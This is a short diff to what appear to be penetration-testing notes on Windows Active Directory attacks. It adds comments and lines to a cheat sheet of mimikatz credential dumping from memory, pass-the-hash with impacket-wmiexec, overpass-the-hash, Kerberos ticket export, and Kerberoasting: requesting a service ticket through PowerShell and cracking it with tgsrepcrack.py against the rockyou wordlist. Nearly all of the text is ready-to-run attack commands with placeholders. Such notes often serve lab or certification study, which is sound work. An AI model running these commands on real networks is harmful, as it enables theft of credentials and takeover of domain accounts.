@@ -2,7 +2,7 @@
 /usr/bin/impacket-wmiexec -hashes :<hash> Administrator@<ip>
 #OverpassTheHash
 mimikatz # privilege::debug
-mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::logonpasswords #from memory
 #get NTLM
 mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:<hash> /run:powershell
 #after convert NTLM in Kerberos TGT you can use any tools that rely kerberos authentication
@@ -15,6 +15,12 @@ klist
 mimikatz # privilege::debug
 mimikatz # sekurlsa::tickets /export
 dir *.kirbi
+#OR export the ticket with
+Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/sql01.exam.com..<spn>'
+.\mimikatz.exe "kerberos::list /export"
+#Cracking the ticket
+python2 tgsrepcrack.py <rockyou> <file.kirbi>
+
 
 Directory: C:\Tools
 Mode LastWriteTime Length Name
